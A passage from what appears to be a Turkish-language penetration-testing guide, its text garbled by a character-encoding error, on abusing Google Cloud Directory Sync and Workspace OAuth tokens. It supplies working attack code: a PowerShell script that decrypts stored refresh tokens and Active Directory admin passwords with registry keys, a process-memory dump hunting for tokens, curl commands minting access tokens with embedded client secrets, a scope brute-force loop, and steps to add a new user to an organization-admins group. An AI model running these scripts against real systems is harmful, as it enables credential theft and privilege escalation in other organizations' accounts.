En ilginÃ§ olanÄ± muhtemelen ÅŸudur:
```c
// OAuth2 scope for access to all Google APIs.
const char kAnyApiOAuth2Scope[] = "https://www.googleapis.com/auth/any-api";
```
Ancak, bu kapsamÄ± gmail'e eriÅŸmek veya gruplarÄ± listelemek iÃ§in kullanmayÄ± denedim ve iÅŸe yaramadÄ±, bu yÃ¼zden hala ne kadar faydalÄ± olduÄŸunu bilmiyorum.

**TÃ¼m bu kapsamlarla bir eriÅŸim belirteci alÄ±n**:

<details>

<summary>TÃ¼m kapsamlarla refresh_token'dan eriÅŸim belirteci oluÅŸturmak iÃ§in Bash betiÄŸi</summary>
```bash
export scope=$(echo "https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome" | tr '\n' ' ')

curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token
```
</details>

Bu kapsamlarÄ±n bazÄ±larÄ±nÄ± kullanarak bazÄ± Ã¶rnekler:

<details>

<summary>https://www.googleapis.com/auth/userinfo.email &#x26; https://www.googleapis.com/auth/userinfo.profile</summary>
```bash
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/oauth2/v2/userinfo"

{
"id": "100203736939176354570",
"email": "hacktricks@example.com",
"verified_email": true,
"name": "John Smith",
"given_name": "John",
"family_name": "Smith",
"picture": "https://lh3.googleusercontent.com/a/ACg8ocKLvue[REDACTED]wcnzhyKH_p96Gww=s96-c",
"locale": "en",
"hd": "example.com"
}
```
</details>

<details>

<summary>https://www.googleapis.com/auth/admin.directory.user</summary>
```bash
# List users
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/admin/directory/v1/users?customer=<workspace_id>&maxResults=100&orderBy=email"

# Create user
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"primaryEmail": "newuser@hdomain.com",
"name": {
"givenName": "New",
"familyName": "User"
},
"password": "UserPassword123",
"changePasswordAtNextLogin": true
}' \
"https://www.googleapis.com/admin/directory/v1/users"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/drive</summary>
```bash
# List files
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(id,name,modifiedTime)&orderBy=name"
{
"files": [
{
"id": "1Z8m5ALSiHtewoQg1LB8uS9gAIeNOPBrq",
"name": "Veeam new vendor form 1 2024.docx",
"modifiedTime": "2024-08-30T09:25:35.219Z"
}
]
}

# Download file
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/<file-id>?alt=media" \
-o "DownloadedFileName.ext"

# Upload file
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/file.ext \
"https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/devstorage.read_write</summary>
```bash
# List buckets from a project
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b?project=<project-id>"

# List objects in a bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/<bucket-name>/o?maxResults=10&fields=items(id,name,size,updated)&orderBy=name"

# Upload file to bucket
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/yourfile.ext \
"https://www.googleapis.com/upload/storage/v1/b/<BUCKET_NAME>/o?uploadType=media&name=<OBJECT_NAME>"

# Download file from bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/BUCKET_NAME/o/OBJECT_NAME?alt=media" \
-o "DownloadedFileName.ext"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/spreadsheets</summary>
```bash
# List spreadsheets
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?q=mimeType='application/vnd.google-apps.spreadsheet'&fields=files(id,name,modifiedTime)&pageSize=100"

# Download as pdf
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/106VJxeyIsVTkixutwJM1IiJZ0ZQRMiA5mhfe8C5CxMc/export?mimeType=application/pdf" \
-o "Spreadsheet.pdf"

# Create spreadsheet
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"properties": {
"title": "New Spreadsheet"
}
}' \
"https://sheets.googleapis.com/v4/spreadsheets"

# Read data from a spreadsheet
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A1:C10"

# Update data in spreadsheet
curl -X PUT \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"range": "Sheet1!A2:C2",
"majorDimension": "ROWS",
"values": [
["Alice Johnson", "28", "alice.johnson@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A2:C2?valueInputOption=USER_ENTERED"

# Append data
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"values": [
["Bob Williams", "35", "bob.williams@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/SPREADSHEET_ID/values/Sheet1!A:C:append?valueInputOption=USER_ENTERED"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/ediscovery (Google Vault)</summary>

**Google Workspace Vault**, Google Workspace iÃ§in veri saklama, arama ve dÄ±ÅŸa aktarma araÃ§larÄ± saÄŸlayan bir eklentidir. Bu araÃ§lar, Gmail, Drive, Chat ve daha fazlasÄ± gibi Google Workspace hizmetlerinde saklanan kuruluÅŸ verilerinizi yÃ¶netmenize yardÄ±mcÄ± olur.

* Google Workspace Vault'taki bir **Matter**, belirli bir dava, soruÅŸturma veya hukuki mesele ile ilgili tÃ¼m bilgileri organize eden ve gruplandÄ±ran bir **kapsayÄ±cÄ±dÄ±r**. Bu, o belirli konu ile ilgili **Holds**, **Searches** ve **Exports** yÃ¶netimi iÃ§in merkezi bir merkez olarak hizmet eder.
* Google Workspace Vault'taki bir **Hold**, belirli kullanÄ±cÄ±lar veya gruplar Ã¼zerinde **veri silinmesini veya deÄŸiÅŸtirilmesini Ã¶nlemek** iÃ§in uygulanan bir **koruma eylemidir**. Holds, ilgili bilgilerin bir hukuki dava veya soruÅŸturma sÃ¼resince saÄŸlam ve deÄŸiÅŸtirilmemiÅŸ kalmasÄ±nÄ± saÄŸlar.
```bash
# List matters
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters?pageSize=10"

# Create matter
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"name": "Legal Case 2024",
"description": "Matter for the upcoming legal case involving XYZ Corp.",
"state": "OPEN"
}' \
"https://vault.googleapis.com/v1/matters"

# Get specific matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>"

# List holds in a matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>/holds?pageSize=10"
```
Daha fazla [API uÃ§ noktasÄ± belgelerde](https://developers.google.com/vault/reference/rest).

</details>

## GCDS - Google Cloud Directory Sync

Bu, **aktif dizin kullanÄ±cÄ±larÄ±nÄ±zÄ± ve gruplarÄ±nÄ±zÄ± Workspace ile senkronize etmek iÃ§in kullanÄ±labilecek bir araÃ§tÄ±r** (ve bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± sÄ±rada tam tersi deÄŸildir).

Ä°lginÃ§ Ã§Ã¼nkÃ¼ bu, **bir Workspace sÃ¼per kullanÄ±cÄ±sÄ±nÄ±n ve ayrÄ±calÄ±klÄ± AD kullanÄ±cÄ±sÄ±nÄ±n kimlik bilgilerini** gerektiren bir araÃ§tÄ±r. Bu nedenle, zaman zaman kullanÄ±cÄ±larÄ± senkronize eden bir alan sunucusunda bulunmasÄ± mÃ¼mkÃ¼n olabilir.

{% hint style="info" %}
**`config-manager.exe`** ikili dosyasÄ±na **MitM** gerÃ§ekleÅŸtirmek iÃ§in `config.manager.vmoptions` dosyasÄ±na aÅŸaÄŸÄ±daki satÄ±rÄ± ekleyin: **`-Dcom.sun.net.ssl.checkRevocation=false`**
{% endhint %}

{% hint style="success" %}
[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) **GCDS**'yi tespit edebilir, yapÄ±landÄ±rma hakkÄ±nda bilgi alabilir ve **hatta ÅŸifreleri ve ÅŸifrelenmiÅŸ kimlik bilgilerini** elde edebilir.
{% endhint %}

AyrÄ±ca, GCDS'nin AD'den Workspace'e ÅŸifreleri senkronize etmeyeceÄŸini unutmayÄ±n. EÄŸer bir ÅŸey olursa, sadece Workspace'te yeni oluÅŸturulan kullanÄ±cÄ±lar iÃ§in rastgele ÅŸifreler Ã¼retecektir, aÅŸaÄŸÄ±daki resimde gÃ¶rebileceÄŸiniz gibi:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5780773316536156543-x.jpg" alt="" width="515"><figcaption></figcaption></figure>

### GCDS - Disk Token'larÄ± ve AD Kimlik Bilgileri

`config-manager.exe` ikili dosyasÄ± (GUI ile ana GCDS ikilisi) yapÄ±landÄ±rÄ±lmÄ±ÅŸ Aktif Dizin kimlik bilgilerini, yenileme token'Ä±nÄ± ve eriÅŸimi varsayÄ±lan olarak **C:\Program Files\Google Cloud Directory Sync** klasÃ¶rÃ¼nde **`Untitled-1.xml`** adlÄ± bir **xml dosyasÄ±nda** saklayacaktÄ±r. Ancak, bu aynÄ± zamanda kullanÄ±cÄ±nÄ±n `Belgeler` klasÃ¶rÃ¼nde veya **herhangi bir baÅŸka klasÃ¶rde** de kaydedilebilir.

AyrÄ±ca, kayÄ±t defteri **`HKCU\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\ui`** iÃ§indeki **`open.recent`** anahtarÄ±, en son aÃ§Ä±lan tÃ¼m yapÄ±landÄ±rma dosyalarÄ±nÄ±n (xml'lerin) yollarÄ±nÄ± iÃ§erir. Bu nedenle, **bunlarÄ± bulmak iÃ§in kontrol etmek mÃ¼mkÃ¼ndÃ¼r**.

Dosya iÃ§indeki en ilginÃ§ bilgiler ÅŸunlardÄ±r:
```xml
[...]
<loginMethod>OAUTH2</loginMethod>
<oAuth2RefreshToken>rKvvNQxi74JZGI74u68aC6o+3Nu1ZgVUYdD1GyoWyiHHxtWx+lbx3Nk8dU27fts5lCJKH/Gp1q8S6kEM2AvjQZN16MkGTU+L2Yd0kZsIJWeO0K0RdVaK2D9Saqchk347kDgGsQulJnuxU+Puo46+aA==</oAuth2RefreshToken>
<oAuth2Scopes>
<scope>https://www.google.com/m8/feeds/</scope>
<scope>https://www.googleapis.com/auth/admin.directory.group</scope>
<scope>https://www.googleapis.com/auth/admin.directory.orgunit</scope>
<scope>https://www.googleapis.com/auth/admin.directory.resource.calendar</scope>
<scope>https://www.googleapis.com/auth/admin.directory.user</scope>
<scope>https://www.googleapis.com/auth/admin.directory.userschema</scope>
<scope>https://www.googleapis.com/auth/apps.groups.settings</scope>
<scope>https://www.googleapis.com/auth/apps.licensing</scope>
<scope>https://www.googleapis.com/auth/plus.me</scope>
</oAuth2Scopes>
[...]
<hostname>192.168.10.23</hostname>
<port>389</port>
<basedn>dc=hacktricks,dc=local</basedn>
<authType>SIMPLE</authType>
<authUser>DOMAIN\domain-admin</authUser>
<authCredentialsEncrypted>XMmsPMGxz7nkpChpC7h2ag==</authCredentialsEncrypted>
[...]
```
Not edin ki **refresh** **token** ve kullanÄ±cÄ±nÄ±n **ÅŸifresi**, rastgele Ã¼retilen bir anahtar ve IV ile **AES CBC** kullanÄ±larak **ÅŸifrelenmiÅŸtir** ve **`HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util`** iÃ§inde saklanmaktadÄ±r (nerede olursa olsun **`prefs`** Java kÃ¼tÃ¼phanesi tercihleri saklar) string anahtarlarÄ± **`/Encryption/Policy/V2.iv`** ve **`/Encryption/Policy/V2.key`** base64 formatÄ±nda saklanmaktadÄ±r.

<details>

<summary>Refresh token ve ÅŸifreyi Ã§Ã¶zmek iÃ§in Powershell scripti</summary>
```powershell
# Paths and key names
$xmlConfigPath = "C:\Users\c\Documents\conf.xml"
$regPath = "SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util"
$ivKeyName = "/Encryption/Policy/V2.iv"
$keyKeyName = "/Encryption/Policy/V2.key"

# Open the registry key
try {
$regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($regPath)
if (-not $regKey) {
Throw "Registry key not found: HKCU\$regPath"
}
}
catch {
Write-Error "Failed to open registry key: $_"
exit
}

# Get Base64-encoded IV and Key from the registry
try {
$ivBase64 = $regKey.GetValue($ivKeyName)
$ivBase64 = $ivBase64 -replace '/', ''
$ivBase64 = $ivBase64 -replace '\\', '/'
if (-not $ivBase64) {
Throw "IV not found in registry"
}
$keyBase64 = $regKey.GetValue($keyKeyName)
$keyBase64 = $keyBase64 -replace '/', ''
$keyBase64 = $keyBase64 -replace '\\', '/'
if (-not $keyBase64) {
Throw "Key not found in registry"
}
}
catch {
Write-Error "Failed to read registry values: $_"
exit
}
$regKey.Close()


# Decode Base64 IV and Key
$ivBytes = [Convert]::FromBase64String($ivBase64)
$keyBytes = [Convert]::FromBase64String($keyBase64)

# Read XML content
$xmlContent = Get-Content -Path $xmlConfigPath -Raw

# Extract Base64-encoded encrypted values using regex
$refreshTokenMatch = [regex]::Match($xmlContent, "<oAuth2RefreshToken>(.*?)</oAuth2RefreshToken>")
$refreshTokenBase64 = $refreshTokenMatch.Groups[1].Value

$encryptedPasswordMatch = [regex]::Match($xmlContent, "<authCredentialsEncrypted>(.*?)</authCredentialsEncrypted>")
$encryptedPasswordBase64 = $encryptedPasswordMatch.Groups[1].Value

# Decode encrypted values from Base64
$refreshTokenEncryptedBytes = [Convert]::FromBase64String($refreshTokenBase64)
$encryptedPasswordBytes = [Convert]::FromBase64String($encryptedPasswordBase64)

# Function to decrypt data using AES CBC
Function Decrypt-Data($cipherBytes, $keyBytes, $ivBytes) {
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.Key = $keyBytes
$aes.IV = $ivBytes

$decryptor = $aes.CreateDecryptor()
$memoryStream = New-Object System.IO.MemoryStream
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cryptoStream.Write($cipherBytes, 0, $cipherBytes.Length)
$cryptoStream.FlushFinalBlock()
$plaintextBytes = $memoryStream.ToArray()

$cryptoStream.Close()
$memoryStream.Close()

return $plaintextBytes
}

# Decrypt the values
$refreshTokenBytes = Decrypt-Data -cipherBytes $refreshTokenEncryptedBytes -keyBytes $keyBytes -ivBytes $ivBytes
$refreshToken = [System.Text.Encoding]::UTF8.GetString($refreshTokenBytes)

$decryptedPasswordBytes = Decrypt-Data -cipherBytes $encryptedPasswordBytes -keyBytes $keyBytes -ivBytes $ivBytes
$decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedPasswordBytes)

# Output the decrypted values
Write-Host "Decrypted Refresh Token: $refreshToken"
Write-Host "Decrypted Password: $decryptedPassword"
```
</details>

{% hint style="info" %}
Bu bilgiyi **`C:\Program Files\Google Cloud Directory Sync`** iÃ§indeki **`DirSync.jar`** java kodunu kontrol ederek `exportkeys` dizesini arayarak kontrol etmenin mÃ¼mkÃ¼n olduÄŸunu unutmayÄ±n (Ã§Ã¼nkÃ¼ bu, ikili dosya `upgrade-config.exe`'nin anahtarlarÄ± dÃ¶kmesini beklediÄŸi cli parametresidir).
{% endhint %}

Powershell betiÄŸi yerine, **`:\Program Files\Google Cloud Directory Sync\upgrade-config.exe`** ikili dosyasÄ±nÄ± `-exportKeys` parametresi ile kullanmak ve anahtar ve IV'yi kayÄ±t defterinden hex formatÄ±nda almak mÃ¼mkÃ¼ndÃ¼r; ardÄ±ndan bu anahtar ve IV ile AES/CBC kullanarak bazÄ± cyberchef araÃ§larÄ± ile bilgiyi ÅŸifre Ã§Ã¶zmek mÃ¼mkÃ¼ndÃ¼r.

### GCDS - Bellekten token dÃ¶kme

GCPW'de olduÄŸu gibi, `config-manager.exe` sÃ¼recinin belleÄŸini dÃ¶kmek mÃ¼mkÃ¼ndÃ¼r (bu, GCDS ana ikili dosyasÄ±nÄ±n GUI ile adÄ±dÄ±r) ve yenileme ve eriÅŸim tokenlerini bulabileceksiniz (eÄŸer zaten oluÅŸturulmuÅŸlarsa).\
AyrÄ±ca AD yapÄ±landÄ±rÄ±lmÄ±ÅŸ kimlik bilgilerini de bulabileceÄŸinizi dÃ¼ÅŸÃ¼nÃ¼yorum.

<details>

<summary>config-manager.exe sÃ¼reÃ§lerini dÃ¶kÃ¼n ve tokenleri arayÄ±n</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "config-manager" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

### GCDS - Yenileme jetonlarÄ±ndan eriÅŸim jetonlarÄ± oluÅŸturma

Yenileme jetonunu kullanarak, aÅŸaÄŸÄ±daki komutta belirtilen istemci kimliÄŸi ve istemci sÄ±rrÄ±nÄ± kullanarak eriÅŸim jetonlarÄ± oluÅŸturmak mÃ¼mkÃ¼ndÃ¼r:
```bash
curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCDS - Kapsamlar

{% hint style="info" %}
Bir yenileme token'Ä±na sahip olsanÄ±z bile, eriÅŸim token'Ä± iÃ§in herhangi bir kapsam talep etmek mÃ¼mkÃ¼n deÄŸildir Ã§Ã¼nkÃ¼ yalnÄ±zca **eriÅŸim token'Ä±nÄ± oluÅŸturduÄŸunuz uygulama tarafÄ±ndan desteklenen kapsamlarÄ± talep edebilirsiniz**.

AyrÄ±ca, yenileme token'Ä± her uygulamada geÃ§erli deÄŸildir.
{% endhint %}

VarsayÄ±lan olarak GCSD, kullanÄ±cÄ± olarak her olasÄ± OAuth kapsamÄ±na eriÅŸime sahip olmayacaktÄ±r, bu nedenle aÅŸaÄŸÄ±daki betiÄŸi kullanarak `refresh_token` ile bir `access_token` oluÅŸturmak iÃ§in kullanÄ±labilecek kapsamlarÄ± bulabiliriz:

<details>

<summary>KapsamlarÄ± brute-force yapmak iÃ§in Bash betiÄŸi</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03PR0VQOSCjS1CgYIARAAGAMSNwF-L9Ir5b_vOaCmnXzla0nL7dX7TJJwFcvrfgDPWI-j19Z4luLpYfLyv7miQyvgyXjGEXt-t0A" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Ve yazma anÄ±nda aldÄ±ÄŸÄ±m Ã§Ä±ktÄ± ÅŸuydu:
```
https://www.googleapis.com/auth/admin.directory.group
https://www.googleapis.com/auth/admin.directory.orgunit
https://www.googleapis.com/auth/admin.directory.resource.calendar
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/admin.directory.userschema
https://www.googleapis.com/auth/apps.groups.settings
https://www.googleapis.com/auth/apps.licensing
https://www.googleapis.com/auth/contacts
```
#### Bir kullanÄ±cÄ± oluÅŸturun ve bunu `gcp-organization-admins` grubuna ekleyin, GCP'de yÃ¼kselmeyi deneyin
```bash
# Create new user
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/users' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"primaryEmail": "deleteme@domain.com",
"name": {
"givenName": "Delete",
"familyName": "Me"
},
"password": "P4ssw0rdStr0ng!",
"changePasswordAtNextLogin": false
}'

# Add to group
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/groups/gcp-organization-admins@domain.com/members' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"email": "deleteme@domain.com",
"role": "OWNER"
}'

# You could also change the password of a user for example
```
{% hint style="danger" %}
Yeni kullanÄ±cÄ±ya SÃ¼per Admin rolÃ¼ vermek mÃ¼mkÃ¼n deÄŸil Ã§Ã¼nkÃ¼ **yenileme token'Ä± gerekli izinleri vermek iÃ§in yeterli kapsamda deÄŸil**.
{% endhint %}

## Admin Dizin Senkronizasyonu

GCDS ile kullanÄ±cÄ±larÄ± senkronize etmenin bu yolunun ana farkÄ±, GCDS'nin bazÄ± ikili dosyalarÄ± indirip Ã§alÄ±ÅŸtÄ±rarak manuel olarak yapÄ±lmasÄ±dÄ±r, oysa **Admin Dizin Senkronizasyonu sunucusuz** olarak Google tarafÄ±ndan yÃ¶netilmektedir [https://admin.google.com/ac/sync/externaldirectories](https://admin.google.com/ac/sync/externaldirectories).

Bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± anda bu hizmet beta aÅŸamasÄ±ndadÄ±r ve 2 tÃ¼r senkronizasyonu desteklemektedir: **Active Directory** ve **Azure Entra ID** Ã¼zerinden:

